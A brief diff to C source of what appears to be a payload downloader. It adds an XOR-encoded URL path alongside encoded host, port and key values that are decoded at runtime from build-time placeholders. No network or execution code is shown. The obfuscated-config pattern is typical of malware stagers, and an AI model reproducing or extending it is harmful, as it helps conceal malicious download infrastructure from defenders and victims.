@@ -28,6 +28,7 @@
 // XOR-encoded configuration arrays
 static const unsigned char encoded_host[] = {ENCODED_HOST};
 static const unsigned char encoded_port[] = {ENCODED_PORT};
+static const unsigned char encoded_path[] = {ENCODED_PATH};
 static const unsigned char encoded_key[] = {ENCODED_KEY};
 
 // Forward declarations
@@ -47,6 +48,7 @@ void downloader_main(void) {
 
   decode_config_string(host, encoded_host, sizeof(host));
   decode_config_string(port, encoded_port, sizeof(port));
+  decode_config_string(path, encoded_path, sizeof(path));
   decode_config_string(key_str, encoded_key, sizeof(key_str));
   derive_key_from_string(key_str, key);
 
